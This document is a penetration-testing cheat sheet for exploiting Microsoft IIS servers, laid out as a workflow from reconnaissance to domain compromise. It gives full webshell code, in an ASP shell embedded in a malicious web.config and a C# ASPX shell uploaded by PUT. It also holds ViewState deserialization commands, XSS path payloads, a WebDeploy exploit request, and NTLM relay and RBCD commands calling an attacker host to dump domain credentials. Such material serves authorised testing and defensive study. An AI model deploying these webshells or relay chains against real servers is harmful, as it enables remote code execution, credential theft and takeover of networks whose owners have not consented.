
## Overview

**IIS (Internet Information Services)** is Microsoft's web server software for Windows Server. It hosts web applications built on ASP.NET, ASP, and other Microsoft technologies.

**Key Components:**
- **ASP.NET** - Modern web framework
- **ASP Classic** - Legacy scripting platform
- **Web.config** - XML-based configuration file
- **ApplicationHost.config** - Server-level configuration

**Common Ports:**
- **80/TCP** - HTTP
- **443/TCP** - HTTPS
- **8080/TCP** - Alternative HTTP

**File Extensions:**
- `.asp`, `.aspx` - Active Server Pages
- `.asmx` - Web Services
- `.ashx` - HTTP Handlers
- `.config` - Configuration files

---

## Exploitation Workflow Summary
```
1. Discovery & Reconnaissance
   ├─ Identify IIS version
   ├─ Enumerate directories/files
   ├─ Test for common misconfigurations
   └─ Check for backup files

2. Vulnerability Identification
   ├─ Tilde enumeration (8.3 names)
   ├─ File upload vulnerabilities
   ├─ Information disclosure
   └─ ViewState deserialization

3. Configuration Exploitation
   ├─ web.config exposure
   ├─ trace.axd information leak
   ├─ PUT method enabled
   └─ Insecure upload handling

4. Code Execution
   ├─ Upload malicious web.config
   ├─ ViewState exploitation
   ├─ WebDeploy vulnerabilities
   └─ Webshell deployment

5. Post-Exploitation
   ├─ Credential harvesting
   ├─ Lateral movement
   ├─ Privilege escalation (IIS → SYSTEM)
   └─ Persistence
```

---

## Initial Reconnaissance

### Common IIS Files & Paths

**Configuration files:**
```
/web.config
/Web.config
/.//WEB-INF/web.config
/.//WEB-INF/web.xml
/global.asax
```

**Debug/trace files:**
```
/trace.axd
/trace.axd?id=1
```

**Default directories:**
```
/aspnet_client/
/_vti_pvt/
/_vti_pvt/service.cnf
```

**Backup files:**
```
/default.asp.bak
/login.asp.bak
/web.config.bak
/confirm.asp.bak
/rootlogin.asp.old
```

**Log files:**
```
/WS_FTP.LOG
/admin/WS_FTP.LOG
```

**Management endpoints:**
```
/msdeploy.axd
/admin/help.cgi
```

### Fuzzing IIS Applications

**Directory enumeration:**
```bash
# With ffuf
ffuf -u http://target.com/FUZZ -w iis_wordlist.txt

# With gobuster
gobuster dir -u http://target.com -w iis_wordlist.txt -x asp,aspx,config

# With dirsearch
dirsearch -u http://target.com -e asp,aspx,config,bak
```

**Extension fuzzing:**
```bash
# Common IIS extensions
.asp
.aspx
.asmx
.ashx
.config
.cs
.vb
.axd
.bak
.old
.inc
```

---

## IIS Tilde Enumeration (8.3 Short Names)

### Understanding 8.3 Naming

Windows uses **8.3 short file names** for backward compatibility:
- First 6 characters of filename
- `~1` suffix (increments if duplicates exist)
- 3-character extension

**Examples:**
```
SecretDocuments.txt  →  SECRET~1.TXT
SomeFile.txt         →  SOMEFI~1.TXT
SomeFile1.txt        →  SOMEFI~2.TXT
```

### Manual Enumeration

**Test for vulnerability:**
```bash
curl http://target.com/*~1*/a.aspx
```

**Response indicators:**
- **404 Not Found** - Vulnerable (name doesn't exist)
- **400 Bad Request** - Vulnerable (name exists)
- **200 OK** - Vulnerable (name exists and accessible)
- **Other** - Likely not vulnerable

**Manual bruteforce:**
```bash
# Directory enumeration
for char in {a..z} {0..9}; do
    curl -s "http://target.com/~$char" -o /dev/null -w "%{http_code} - ~$char\n"
done

# Once short name found (e.g., SECRET~1)
for char in {a..z}; do
    curl -s "http://target.com/secret~1/${char}*~1*.txt" -o /dev/null -w "%{http_code}\n"
done
```

### Automated Tools

**IIS ShortName Scanner (Java):**
```bash
java -jar iis_shortname_scanner.jar 0 5 http://target.com/
```

**ShortScan (Python):**
```bash
# Full scan
shortscan http://target.com -F

# Fast scan
shortscan http://target.com
```

**IIS_shortname_Scanner (Python):**
```bash
python iis_shortname_scan.py http://target.com
```

### Exploiting Discovered Short Names

**Generate wordlist from short names:**
```bash
# If you found TRANSF~1.ASP
grep -r "^transf" /usr/share/wordlists/ | sed 's/^[^:]*://' > wordlist.txt
```

**Bruteforce full filename:**
```bash
gobuster dir -u http://target.com/ -w wordlist.txt -x .aspx,.asp
```

### Nuclei Template
```yaml
id: iis-shortname

info:
  name: IIS 8.3 Short Name Enumeration
  author: coffin
  severity: low
  description: Enumerates IIS directories using 8.3 short names

variables:
  randstring: "{{to_lower(rand_base(8))}}"

requests:
  - raw:
    - |
        GET /{{randstring}}*~1*/a.aspx HTTP/1.1
        Host: {{Hostname}}
    - |
        GET /*~1*/a.aspx HTTP/1.1
        Host: {{Hostname}}
    - |
        OPTIONS /{{randstring}}*~1*/a.aspx HTTP/1.1
        Host: {{Hostname}}
    - |
        DEBUG /{{randstring}}*~1*/a.aspx HTTP/1.1
        Host: {{Hostname}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 != 404 && status_code_2 == 404"
```

---

## Configuration File Exploitation

### web.config Vulnerabilities

**What is web.config?**
XML file containing IIS application settings, connection strings, authentication config, and custom code.

**Access attempts:**
```bash
# Direct access
curl http://target.com/web.config

# Path traversal
curl http://target.com/.//WEB-INF/web.config
curl http://target.com/../web.config

# Backup files
curl http://target.com/web.config.bak
curl http://target.com/Web.config.old
```

**Sensitive information in web.config:**
```xml
<!-- Database credentials -->
<connectionStrings>
    <add name="DefaultConnection" 
         connectionString="Server=DB;Database=myDB;User Id=admin;Password=P@ssw0rd" />
</connectionStrings>

<!-- Application keys -->
<appSettings>
    <add key="AdminPassword" value="SecretPass123" />
    <add key="APIKey" value="abc123xyz" />
</appSettings>

<!-- Authentication settings -->
<authentication mode="Forms">
    <forms protection="All" timeout="30" />
</authentication>
```

### Malicious web.config Upload

**If file upload exists:**

**Technique 1: Basic RCE**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" 
              modules="IsapiModule" 
              scriptProcessor="%windir%\system32\inetsrv\asp.dll" 
              resourceType="Unspecified" 
              requireAccess="Write" 
              preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Response.write("-"&"->")
Response.write("<pre>")
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
<%
Response.write("<!-"&"-")
%>
```

**Access webshell:**
```bash
curl "http://target.com/web.config?cmd=whoami"
```

**Technique 2: PHP on IIS bypass**

If PHP is running, use filename tricks:
```
web
web<<>fig
web"config
```

These bypass upload filters but are interpreted as `web.config` by IIS.

---

## Trace.axd Information Disclosure

**What is trace.axd?**
ASP.NET diagnostic feature that logs detailed request information including:
- Session variables
- Cookies
- Server variables
- Request/response data
- ViewState contents

**Access attempts:**
```bash
curl http://target.com/trace.axd
curl http://target.com/trace.axd?id=1
```

**What to look for:**
- Session tokens
- Authentication cookies
- Internal IP addresses
- Database connection strings
- Application paths
- User credentials in POST data

---

## ViewState Exploitation

### Understanding ViewState

**ViewState** is ASP.NET's mechanism for maintaining page state across postbacks. It's base64-encoded and can contain:
- Form values
- Page state
- Hidden data
- Sometimes sensitive information

**Vulnerabilities:**
- Insecure deserialization (if `machineKey` known)
- Information disclosure (if not encrypted)

### Exploitation Tools

**ViewGen (generate malicious ViewState):**
```bash
# Generate payload
./viewgen --generator="CA0B0334" \
  --validation-key="VALIDATION_KEY" \
  --validation-algorithm="SHA1" \
  --decryption-key="DECRYPTION_KEY" \
  --decryption-algorithm="AES" \
  --payload="command" \
  --path="/page.aspx"
```

**YSoSerial.Net:**
```bash
# If you have machineKey values from web.config
ysoserial.exe -p ViewState \
  -g TextFormattingRunProperties \
  -c "cmd /c calc.exe" \
  --path="/page.aspx" \
  --decryptionalg="AES" \
  --decryptionkey="DECRYPTION_KEY" \
  --validationalg="HMACSHA256" \
  --validationkey="VALIDATION_KEY"
```

---

## PUT Method Enabled

### Test for PUT
```bash
# Check allowed methods
curl -X OPTIONS http://target.com/ -i

# Look for:
Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
```

### Upload Webshell

**ASPX webshell:**
```bash
# Create simple webshell
cat > shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (cmd != null)
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>
EOF

# Upload via PUT
curl -X PUT -d @shell.aspx http://target.com/shell.aspx

# Access
curl http://target.com/shell.aspx?cmd=whoami
```

**Upload web.config:**
```bash
curl -X PUT -d @malicious.config http://target.com/web.config
```

---

## XSS in IIS Applications

### ASP.NET Path-Based XSS

**Technique:**
ASP.NET often reflects path components in error messages.

**Payload:**
```
http://target.com/folder/(Z("onerror="alert(1)"))/file.aspx
http://target.com/page/(Z("onerror="confirm('XSS')"))/resource.aspx
```

**Why it works:**
- IIS reflects the path in error pages
- Parentheses break out of HTML context
- Quotation marks inject JavaScript

---

## Internal IP Disclosure

**HTTP/1.0 downgrade trick:**
```bash
curl -v --http1.0 http://target.com
```

**Look for:**
```http
HTTP/1.1 302 Moved Temporarily
Location: https://192.168.1.10/resource
Server: Microsoft-IIS/10.0
X-FEServer: INTERNAL-SERVER
```

**Why it matters:**
- Reveals internal network structure
- Aids in pivoting
- May expose development servers

---

## CVE-2025-53772 - IIS WebDeploy RCE

### Vulnerability Details

**Affected endpoint:**
```
/msdeploy.axd
```

**Check for vulnerability:**
```bash
curl http://target.com/msdeploy.axd
```

**Exploitation:**
```http
POST /msdeploy.axd HTTP/1.1
Host: target.com
MSDeploy.RequestId: 1
Content-Type: application/msdeploy
MSDeploy.Method: Sync
MSDeploy.SyncOptions: [GENERATED_PAYLOAD]
Content-Length: 0
```

**Impact:**
- Remote code execution as IIS application pool identity
- Typically runs as `IIS APPPOOL\DefaultAppPool`
- Can lead to SYSTEM access

---

## Privilege Escalation from IIS

### HTTP Coercion for Machine Account

**From compromised IIS:**
```powershell
# Force machine account authentication
Invoke-WebRequest http://attacker-ip/ -UseDefaultCredentials
```

**What happens:**
1. Request uses machine account (`COMPUTERNAME$`)
2. Sends NTLM authentication
3. Attacker captures NetNTLMv2 hash

**Relay attack workflow:**
```bash
# Start Responder
sudo responder -I eth0

# Or start ntlmrelayx
ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access

# From IIS, trigger authentication
powershell iwr http://attacker-ip/ -UseDefaultCredentials
```

### RBCD Attack Chain
```
1. Compromise IIS → Execute PowerShell
2. Trigger machine account auth → Capture/relay
3. Relay to LDAP → Add computer account
4. Configure RBCD → Allow impersonation
5. Request TGT → Impersonate admin
6. Access DC → Domain compromise
```

**Commands:**
```bash
# 1. Start relay with RBCD
ntlmrelayx.py -t ldaps://dc.domain.local \
  --delegate-access \
  --escalate-user FAKECOMPUTER$

# 2. Trigger from IIS
powershell iwr http://attacker-ip/ -UseDefaultCredentials

# 3. Once computer added, request TGT
getST.py -spn cifs/dc.domain.local \
  -impersonate administrator \
  domain.local/FAKECOMPUTER$

# 4. Use ticket
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass dc.domain.local
```

